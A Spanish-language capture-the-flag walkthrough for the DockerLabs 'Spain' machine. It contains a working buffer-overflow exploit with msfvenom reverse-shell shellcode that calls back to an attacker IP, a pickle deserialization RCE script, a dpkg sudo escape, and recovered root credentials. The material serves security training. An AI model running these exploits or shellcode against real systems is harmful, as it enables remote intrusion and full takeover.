![Screenshot](/hard/Spain/Images/machine.png)

Dificultad: **Dificíl**

Hecho por: **darksblack**

# Pasos para pwnearlo 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🔍 [Enumeración](#enumeración)
* 🪓 [Explotación](#exploitación)
* ⤵️  [Movimiento Lateral](#movimiento-lateral)
* 🚩 [Escalada de Privilegios](#escalada-de-privilegios)

---

## 🛠️  Técnicas: Enumeración con gobuster, análisis de binario, explotar un BoF y obtener acceso al sistema, Explotar la librería pickle para lograr RCE, cambiar al usuario darksblack con dpkg, analizar binario con ghidra y análisis dinámico con ltrace, obtener número de serie en el código y escalar privilegios con la contraseña de root.

---

Primero que nada nos aseguramos de que la máquina esté activa, podemos verificarlo con el comando **ping**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.240 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.131 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.128 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2034ms
rtt min/avg/max/mdev = 0.128/0.166/0.240/0.052 ms
```

Ahora, podemos comenzar nuestra fase de **reconocimiento**.

---
# Reconocimiento

Siempre comenzamos con **nmap** para saber qué puertos están abiertos en el objetivo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-08 15:28 -0500
Initiating ARP Ping Scan at 15:28
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:28, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:28
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 9000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:28, 2.66s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000038s latency).
Scanned at 2026-01-08 15:28:39 -05 for 3s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
9000/tcp open  cslistener syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.05 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le decimos a nmap que escanee todos los puertos, comenzando desde el puerto 1, hasta el puerto 65,535.

**-n** <- Con este argumento nmap va a omitir la resolución DNS, esto es porque a veces en nuestros escaneos esto puede ser muy lento en algunos casos.

**-sS** <- Con este argumento nmap va a realizar un escaneo sigiloso, esto significa que el 3-way-handshake no se completará, y también hace el escaneo un poco más rápido.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, haciendo el escaneo aún más rápido.

**-Pn** <- Con este argumento nmap también omitirá la fase de descubrimiento de host, esto significa que nmap tratará la máquina como activa y hará el escaneo inmediatamente.

**-vv** <- Con este argumento nmap nos mostrará los puertos abiertos descubiertos mientras el escaneo continúa, esto significa que si nmap descubre un puerto abierto inmediatamente nos lo reportará mientras el escaneo continúa.

**--open** <- Con este argumento le estamos diciendo a nmap que solo filtre los puertos abiertos.

Una vez que el escaneo concluye, parece que hay 3 puertos abiertos:

- puerto 22 (ssh / Secure Shell)
- puerto 80 (http / Hyper-Text Transfer Protocol)
- puerto 9000 (???)

Así que hagamos otro escaneo con **nmap** para saber qué servicios y versiones están ejecutándose.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ nmap -p22,80,3000 -sCV 172.17.0.2 -oX target
```

**-p22,80,9000** <- Con este argumento nmap solo escaneará estos 3 puertos que descubrimos.

**-sCV** <- Con este argumento nmap va a escanear por cada puerto su versión para encontrar posibles vulnerabilidades sobre sistemas no actualizados, y también hacer un escaneo con algunos scripts que ejecuta nmap, para encontrar más sobre estos puertos.

**-oX target** <- Con este argumento guardamos toda la salida que nmap nos da y lo guardamos como un archivo xml.

Después de que el escaneo termine obtenemos la salida en un archivo xml, hacemos esto para crear una página html y ver la información más fácilmente y más bonita a la vista.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ xsltproc target -o target.html
```

Con este comando convertimos el archivo xml a un archivo html, ahora vamos a abrirlo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ open target.html 
```

Y podemos ver esto en nuestro navegador.

![Screenshot](/hard/Spain/Images/image1.png)

Podemos ver que el puerto 80 es un sitio web, y nos redirige a **spainmerides.dl** esto es virtual hosting así que necesitamos poner ese dominio en el archivo **/etc/hosts** para poder ver el **sitio web**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ head -n1 /etc/hosts
172.17.0.2      spainmerides.dl
```

Ahora podemos ver qué tecnologías usa este dominio con **whatweb**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ whatweb http://spainmerides.dl
http://spainmerides.dl [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2], Title[Efemérides Españolas]
```

Parece que usa **apache**, pero nada más interesante.

Así que echemos un vistazo con el navegador.

![Screenshot](/hard/Spain/Images/image2.png)

Podemos ver esto, este sitio web usa php, y después de mirar en el código fuente, no encontramos nada interesante aquí.

---
 Enumeración

Podemos usar **gobuster** para intentar encontrar posibles archivos o directorios en el sitio web.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ gobuster dir -u http://spainmerides.dl -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://spainmerides.dl
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 776]
/manager.php          (Status: 200) [Size: 1472]
```

**-x** <- Con este argumento le estamos diciendo a **gobuster** que agregue más extensiones, como en este caso estamos intentando encontrar archivos con la extensión de **php, html, txt**.

Y encontramos otro archivo php, **manager.php**

Así que echemos un vistazo con el navegador.

![Screenshot](/hard/Spain/Images/image3.png)

Podemos ver que podemos descargar algo, así que vamos a obtenerlo y ver qué hace.

Podemos ver que esto es un archivo binario, un ejecutable

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ file bitlock 
bitlock: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5b79b3eebf4e41a836c862279f4a5bc868c61ce7, for GNU/Linux 3.2.0, not stripped
```

Este binario tiene una arquitectura de 32 bits.

Bien, así que vamos a ejecutarlo y ver qué pasa.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ ./bitlock 
Esperando conexiones en el puerto 9000...
```

Podemos ver que está en modo escucha en el puerto **9000** como en la máquina objetivo, podemos intentar conectarnos a nuestra máquina en el **localhost** con **netcat**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ nc localhost 9000
hello
```

Ingresé este texto, y en el lado del servidor podemos ver esto:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ ./bitlock 
Esperando conexiones en el puerto 9000...
************************
* hello
0 *
************************
```

Parece que recibimos el mensaje, así que podemos intentar enviar muchos datos y ver qué pasa

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ nc localhost 9000
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

Y podemos ver esto:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ ./bitlock 
Esperando conexiones en el puerto 9000...
************************
* hello
0 *
************************
************************
* AAAAAAAAAAAAAAAAAAAAAAAAAA...0 *
************************
zsh: segmentation fault  ./bitlock
```

Causamos un **buffer overflow** en este script, así que hagamos un análisis con **gdb** y ejecutemos el programa una vez más.

---
# Explotación

Para ver qué pasa en el script mismo.

```lua
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ gdb -q bitlock 
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.01ms using Python engine 3.13
Reading symbols from bitlock...
(No debugging symbols found in bitlock)
gef➤
```

Genial, ahora vamos a ejecutar una vez más este binario con solo **r**

```r
gef➤  r
Starting program: /home/craft/challenges/dockerlabs/dificil/spain/files/bitlock 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Esperando conexiones en el puerto 9000...
```

Bien, ahora vamos a conectarnos e ingresar una vez más muchos datos.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ nc localhost 9000
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

![Screenshot](/hard/Spain/Images/image4.png)

Podemos ver mucha información aquí, pero solo veamos los primeros datos que son los registros, que están siendo indicados con el color **rojo**

Podemos ver que cuando ingresamos muchos datos en el buffer (buffer es como un espacio disponible de datos) que sobrescribimos más registros como **EBP** y **EIP**

Esto es peligroso porque podemos cambiar el flujo del programa como queramos.

Si no sabes qué es un **EIP** (Extended Instruction Pointer) básicamente le está diciendo al programa qué instrucción necesita ser ejecutada después, es como una guía para el programa.

Y como podemos ver en la imagen **EIP** su valor es **AAAA** (0x41414141), para la computadora esta dirección es inválida, porque no existe una instrucción con esa dirección.

Así que si modificamos el valor de **EIP** podemos cambiar el flujo del programa a donde queramos, y llevar la ejecución del programa a otro lugar.

Bien, así que verifiquemos qué protecciones usa este binario con **checksec**

```r
gef➤  checksec
[+] checksec for '/home/craft/challenges/dockerlabs/dificil/spain/files/bitlock'
Canary  : ✘
NX      : ✘
PIE     : ✘
Fortify : ✘
RelRO   : Partial
```

Podemos ver que la protección de **NX** (No Ejecutable) está deshabilitada, esto significa que podemos ejecutar comandos al sistema.

Así que podemos ingresar **shellcodes** en la pila para ejecutar comandos en el sistema.

Pero necesitamos el **offset** de **EIP** esto es como una ubicación de la EIP antes de **overwritting** en ella.

Podemos usar **patterns** para saber el número total de bytes antes de escribir eip.

Todos estos funciones que estoy usando es un plugin de GDB, que es **gef** puedes tomar un vistazo en github [aquí](https://github.com/hugsy/gef)

```lua
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaa...                 
[+] Saved as '$_gef0'
```

Bien, así que vamos a copiar todo esto al portapapeles.

Luego, vamos a ejecutar una vez más el programa para conectarnos una vez más e ingresar todo esto.

Luego, vamos a conectarnos una vez más con **netcat**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ nc localhost 9000
Enter data: aaaabaaacaaadaaaeaaaf...
```

Y podemos ver esto:

![Screenshot](/hard/Spain/Images/image5.png)

Looks the same but with just different strings.

And we can get the offset of EIP with the next command:

**pattern offset $eip**

```r
gef➤  pattern offset $eip
[+] Searching for '61616761'/'61676161' with period=4
[+] Found at offset 22 (little-endian search) likely
```

Y encontramos el offset de eip que es **22**, para verificarlo podemos hacer una cadena de caracteres de 300 bytes y agregar **BBBB** para ver si podemos sobrescribir el EIP con estos caracteres

```r
AAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

Luego, vamos a ejecutar una vez más el programa y conectarnos para ingresar esta cadena.

![Screenshot](/hard/Spain/Images/image6.png)

Podemos ver que encontramos el offset de eip es igual a 22, y su valor es BBBB, también podemos ver que **ESP** (Extended Stack Pointer) está siendo sobrescrito con un montón de Cs

**ESP** es otro registro que apunta al tope de la pila (el elemento más recientemente empujado), así que podemos intentar saber dónde está ubicado **ESP** con **objdump** al binario.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ objdump -d bitlock | grep jmp | grep esp 
0804948b <jmp_esp>:
 804948b:       ff e4                   jmp    *%esp
```

Encontramos la ubicación de esta instrucción que es: **804948b** (0x804948b)

Y para la instrucción **jmp esp** esto hace que el **CPU** salte a la memoria dirección a **ESP**, esto es muy importante para saber para ejecutar comandos correctamente.

Así que después de todo esto podemos hacer un exploit, y usar **pwntools**.

Para generar el **shellcode** y hacer un reverse shell, podemos usar **msfvenom**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.20 LPORT=1234 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x00"
"\x14\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3"
"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```

Todo ese string es el **shellcode.**

Así que aquí está el exploit hecho con python.

```r
from pwn import *

target = "172.17.0.2"
port = 9000

def send():
    connect = remote(target, port)

    # 0804948b

    eip_offset = 22

    esp = b"\x8b\x94\x04\x08"

    payload = b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
    payload += b"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x00"
    payload += b"\x14\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3"
    payload += b"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
    payload += b"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

    nops = b"\x90"*30

    trash = b"A"*eip_offset + esp + nops + payload

    connect.sendline(trash)

    connect.close()

if __name__ == "__main__":
    send()
```

Necesitamos cambiar el orden del esp porque este binario es una arquitectura de **little-endian** y la dirección necesita estar en reversa.

Y los **NOPS** son básicamente una serie de bytes que son **no operación** estos **NOPS** están siendo guardados en la pila, y esos bytes van a hacer que no inmediatamente se ejecute el **shellcode**, porque a veces las direcciones en la memoria pueden ser afectadas o ser un poco diferentes.

Lo voy a hacer un diagrama con **excalidraw** para mostrar como funciona este exploit.

![Screenshot](/hard/Spain/Images/image7.png)

Bien, así que vamos a hacer un **netcat** listener para recibir el shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

**-l**  <- Este argumento hace que netcat esté en modo de escucha.

**-v** <- Este argumento activa el modo **verbose**, esto nos mostrará en más detalle la conexión que recibimos.

**-n** <- Esto hace que netcat omita la búsqueda DNS, y solo use la dirección IP directamente.

**-p** <- El puerto en el que estamos escuchando, puede ser cualquier, si no está siendo utilizado actualmente.

Ahora vamos a ejecutar el exploit para hacer un **BoF** y ejecutar comandos arbitrarios en el sistema.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/exploits]
└─$ python3 exploit.py 
[+] Opening connection to 172.17.0.2 on port 9000: Done
[*] Closed connection to 172.17.0.2 port 9000
```

Ahora recibimos esto en el **netcat** listener:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 35614
whoami
www-data
```

Estamos dentro!

Ahora personalizaremos esta shell para que funcione de manera más cómoda.

En primer lugar hacemos esto:

```r
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

Este comando crea una nueva sesión bash con **script** y **/dev/null** como archivo de salida, porque script registra cada comando que ejecutamos en un registro, pero con la ruta /dev/null, hacemos que ese registro no pueda grabar comandos, y **-c bash** hace que script ejecute el shell con bash.

Hacemos esto porque queremos usar CTRL + C y más funciones de bash.

Cuando ejecutamos esto, suspendemos nuestra reverse shell por un momento.

Luego ejecutamos el siguiente comando en nuestra máquina de ataque:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ stty raw -echo; fg
```

Este comando hace que stty trate la terminal.

**raw** <- Con raw estamos haciendo que todos los datos de salida y entrada sean sin procesar.

**-echo** <- Con esto hacemos que si ejecutamos un comando no se imprima nuevamente en la salida.

**; fg** <- Y con esto reanudamos nuestra reverse shell nuevamente.

Cuando ejecutamos este comando reiniciamos xterm:

```r
reset xterm
```

Esto va a reiniciar la terminal.

Si queremos limpiar nuestra terminal no podemos hacerlo porque el término será diferente del xterm, que tiene esta función. Podemos hacerlo de la siguiente manera para poder limpiar nuestra pantalla si se pone fea:

```r
www-data@dockerlabs:/$ export TERM=xterm
```

Y una última cosa, ¡si notamos que la visualización de la terminal es muy pequeña!

Podemos ajustar esto para que sea más grande con el siguiente comando:

```r
www-data@dockerlabs:/$ stty rows {num} columns {num}
```

¡y finalmente se ve mucho mejor!

---
# Movimiento Lateral

Ahora podemos cambiar a otro usuario porque tenemos un privilegio de SUDOER cuando ejecutamos **sudo -l**

```r
www-data@dockerlabs:/$ sudo -l
Matching Defaults entries for www-data on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on dockerlabs:
    (maci) NOPASSWD: /bin/python3 /home/maci/.time_seri/time.py
```

Podemos ejecutar este script de python como el usuario **maci**, dejemos echar un vistazo al código.

![Screenshot](/hard/Spain/Images/image8.png)

Parece que importa **pickle** y **os**, especialmente **pickle** podemos explotarlo a un **RCE**.

Y como funciona?

Es un poco difícil de explicar porque necesitamos hablar de cómo python **serializa** y **deserializa** datos y cómo pickle funciona con esto a bajo nivel.

Si quieres saber más sobre todo esto y por qué pickle es una mala idea para usar, puedes echar un vistazo [aquí](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

En resumen, cuando **serializamos** datos con el formato pickle, está trabajando con bytes y cuando **deserializamos** es como recuperar una vez más la información, pero cuando pickle desarializa está ejecutando byte por byte como cuando pickle lo hace.

Ejemplo:

```python
>>> import pickle
>>> pickle.dumps(["pwned", 1, 2, "yayy!!"])
b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05pwned\x94K\x01K\x02\x8c\x06yayy!!\x94e.'
```

Este es el formato pickle.

Para deserializarlo necesitamos cargar esa cadena de bytes, y podemos ver que la información se recupera.

```python
>>> pickle.loads(b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05pwned\x94K\x01K\x02\x8c\x06yayy!!\x94e.')
['pwned', 1, 2, 'yayy!!']
```

Podemos recuperar la información, y puedes ver por qué esto es vulnerable, podemos hacer un payload que en lugar de hacer todo esto podemos intentar importar la librería **os** y ejecutar código arbitrario.

Así que voy a hacer un script de python para hacer todo esto por nosotros.

Y voy a hacer un diagrama del script de python que es vulnerable con **excalidraw**

![Screenshot](/hard/Spain/Images/image9.png)

Espero que puedas entenderlo con este diagrama...

Y este es el exploit de pickle:

```python
import os, pickle

file = "/opt/data.pk1"
config = "/home/maci/.time_seri/time.conf"

def execute(payload):
    class RCE:
        def __reduce__(self):
            return (os.system, (payload,))

    convert = pickle.dumps(RCE())

    with open(file, "wb") as f: f.write(convert)

    print("\n[!] Payload saved.")

    with open(config, "w") as conf: conf.write("serial=on")

    print("[i] Serial mode: ON\n[!] EXECUTING PAYLOAD")

    os.system("sudo -u maci python3 /home/maci/.time_seri/time.py")

if __name__ == "__main__":
    cmd = str(input("[*] CMD -> ")).strip()

    execute(cmd)
```

Bien, así que ahora vamos a ejecutar el exploit.

```r
www-data@dockerlabs:/tmp$ python3 rce_pickle.py 
[*] CMD -> bash

[!] Payload saved.
[i] Serial mode: ON
[!] EXECUTING PAYLOAD
maci@dockerlabs:/tmp$ whoami
maci
```

¡Excelente, ahora somos el usuario **maci**!

Si con este usuario **maci**, tenemos un privilegio de **SUDOER** cuando ejecutamos **sudo -l**

```r
maci@dockerlabs:/tmp$ sudo -l
Matching Defaults entries for maci on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User maci may run the following commands on dockerlabs:
    (darksblack) NOPASSWD: /usr/bin/dpkg
```

Podemos ver que podemos ejecutar el comando **dpkg** como el usuario **darksblack** sin contraseña.

Podemos ejecutar comandos con este usuario cuando ejecutamos el siguiente comando:

- **sudo -u darksblack dpkg -l**

Y podemos ejecutar el comando algo como esto: **!(command)**

```r
maci@dockerlabs:/tmp$ sudo -u darksblack dpkg -l
......
!bash
darksblack@dockerlabs:/tmp$ whoami
bash: whoami: command not found
darksblack@dockerlabs:/tmp$ id
```

¡Y ganamos acceso como este usuario **darksblack**! pero no podemos ejecutar ningún comando, veamos si podemos ejecutar el siguiente comando: id con la ruta completa del binario.

```r
darksblack@dockerlabs:/tmp$ /bin/id
uid=1002(darksblack) gid=1002(darksblack) groups=1002(darksblack)
```

Y funciona, veamos el valor de nuestro **PATH**

```r
darksblack@dockerlabs:/tmp$ echo $PATH
/home/darksblack/bin
```

Podemos ver que el PATH es muy limitado, así que necesitamos definir un PATH para ejecutar comandos correctamente, podemos tomar el valor del PATH del usuario **maci**, copiando a nuestro portapapeles y entrar este nuevo valor.

```r
maci@dockerlabs:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Vamos a copiar esto y luego vamos a movernos una vez más al usuario **darksblack**

```r
darksblack@dockerlabs:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
no tan rapido campeon!
```

Parece que no podemos usar **export** pero no es problema y podemos hacer esto entonces:

```r
darksblack@dockerlabs:/tmp$ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
darksblack@dockerlabs:/tmp$ id
```

Ahora podemos ejecutar cualquier comando en el sistema con esta nueva ruta!

---
# Escalada de Privilegios

Después de mucho tiempo intentando escalar privilegios, en el directorio de inicio del usuario **darksblack** vemos un binario.

```r
darksblack@dockerlabs:~$ ls -la
total 56
drwxr-x--- 1 darksblack darksblack  4096 Jan 10 20:43 .
drwxr-xr-x 1 root       root        4096 Dec 26  2024 ..
lrwxrwxrwx 1 root       root           9 Dec 26  2024 .bash_history -> /dev/null
-rw-r--r-- 1 root       root         220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 root       root        3613 Jan  1  2025 .bashrc
drwxr-xr-x 3 darksblack darksblack  4096 Jan 10 20:42 .local
-rw-r--r-- 1 root       root         807 Mar 29  2024 .profile
-rw------- 1 darksblack darksblack   726 Jan  1  2025 .viminfo
drwxr-xr-x 2 darksblack darksblack  4096 Jan  1  2025 .zprofile
-rwxr-xr-x 1 darksblack darksblack 15048 Jan  1  2025 Olympus
drwxr-x--- 1 darksblack darksblack  4096 Jan  1  2025 bin
```

El binario es **Olympus**.

Vamos a ejecutarlo y ver qué pasa.

```r
darksblack@dockerlabs:~$ ./Olympus 
Selecciona el modo:
1. Invitado
2. Administrador
2
Introduce el serial: 1234
Serial invalido, vuelve a intentar
```

Así que vamos a transferir este binario a nosotros, usando **python3** para hacer un servidor en la máquina objetivo y descargarlo con **wget**.

```r
darksblack@dockerlabs:~$ python3 -m http.server 100
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ..
```

Ahora vamos a descargarlo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ wget http://172.17.0.2:100/Olympus
--2026-01-10 15:58:26--  http://172.17.0.2:100/Olympus
Connecting to 172.17.0.2:100... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15048 (15K) [application/octet-stream]
Saving to: ‘Olympus’

Olympus                                                     100%[================================================>]  14.70K  --.-KB/s    in 0s   

2026-01-10 15:58:26 (599 MB/s) - ‘Olympus’ saved [15048/15048]
```

Ahora vamos a analizarlo con **ghidra** y haciendo reverse engineering.

Así que voy a editar la función main para entenderla mejor.

```c

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  int real_serial;
  char return_serial [150];
  char true_serial [100];
  char examine_serial [10];
  undefined1 serial_user_input [100];
  int user_option;
  FILE *possible_serial;
  undefined1 *local_10;
  
  local_10 = &stack0x00000004;
  puts("Selecciona el modo:\n1. Invitado\n2. Administrador");
  __isoc99_scanf(&DAT_0804a039,&user_option);
  if (user_option == 2) {
    printf("Introduce el serial: ");
    __isoc99_scanf(&DAT_0804a052,serial_user_input);
                    /* Checks serial number */
    snprintf(return_serial,150,"/home/darksblack/.zprofile/OlympusValidator %s",serial_user_input);
    possible_serial = popen(return_serial,"r");
    if (possible_serial == (FILE *)0x0) {
      puts("Error al ejecutar el comando.");
      return 1;
    }
    fgets(examine_serial,10,possible_serial);
    fgets(true_serial,100,possible_serial);
    pclose(possible_serial);
    real_serial = strncmp(examine_serial,"VALIDO",6);
                    /* If the serial is valid */
    if (real_serial == 0) {
      printf("%s",true_serial);
    }
    else {
      puts("Serial invalido, vuelve a intentar");
    }
  }
  if (user_option == 1) {
    puts("Bienvenido al modo invitado, aqui podras obtener la lista de tareas pendientes.");
    puts("1. Desarrollo website empresa: Tradeway Consulting CORP");
    puts("2. Prueba de Penetracion empresa: Tradeway Consulting CORP");
    puts("3. Securizar red corporativa en Tradeway Consulting CORP");
  }
  if ((user_option != 1) && (user_option != 2)) {
    puts("Seleccion Incorrecta");
  }
  return 0;
}
```

Aquí tenemos toda la función main en C del binario **Olympus**.

Podemos ver que cuando ingresamos el número de serie, ejecuta otro ejecutable y pasa el número de serie a este path:

- **/home/darksblack/.zprofile/OlympusValidator %s**

Parece que es un directorio oculto en el directorio de inicio del usuario **darksblack**, este binario es **OlympusValidator** y pasa el número de serie.

Así que vamos a descargar este binario oculto una vez más con **wget**

```r
darksblack@dockerlabs:~$ cd .zprofile/
darksblack@dockerlabs:~/.zprofile$ ls
OlympusValidator
darksblack@dockerlabs:~/.zprofile$ python3 -m http.server 100 &
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ...
```

Ahora vamos a descargarlo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ wget http://172.17.0.2:100/OlympusValidator
--2026-01-10 16:23:56--  http://172.17.0.2:100/OlympusValidator
Connecting to 172.17.0.2:100... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14952 (15K) [application/octet-stream]
Saving to: ‘OlympusValidator’

OlympusValidator                                            100%[==================================================>]  14.60K  --.-KB/s    in 0.009s  
2026-01-10 16:23:56 (1.60 MB/s) - ‘OlympusValidator’ saved [14952/14952]
```

Ahora vamos a ejecutarlo y ver qué pasa.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ ./OlympusValidator 1234
INVALIDO
```

Parece que este binario realmente verifica si el número de serie es válido, podemos usar **ltrace** para ejecutar el programa como de costumbre pero ver más información a bajo nivel cómo funciona.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ ltrace ./OlympusValidator 1234
__libc_start_main(["./OlympusValidator", "1234"] <unfinished ...>
snprintf("A678-GHS3-OLP0-QQP1-DFMZ", 50, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c"..., 'A', '6', '7', '8', '-', 'G', 'H', 'S', '3', '-', 'O', 'L', 'P', '0', '-', 'Q') = 24
strcmp("1234", "A678-GHS3-OLP0-QQP1-DFMZ")                                                                                                         = -1
puts("INVALIDO"INVALIDO
)                                               = 9
+++ exited (status 0) +++
```

Y aquí podemos encontrar el número de serie real! que es:

- **A678-GHS3-OLP0-QQP1-DFMZ**

Vamos a introducir esto en el Validador y ver si es el real.

```c
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ ./OlympusValidator A678-GHS3-OLP0-QQP1-DFMZ
VALIDO
Credenciales ssh root:@#*)277280)6x4n0
```

Y hemos obtenido las credenciales del usuario **root**!

Vamos a ver si funciona.

```r
darksblack@dockerlabs:/$ su
Password: 
root@dockerlabs:/# whoami
root
```

¡Ahora somos root ***...pwned..!***
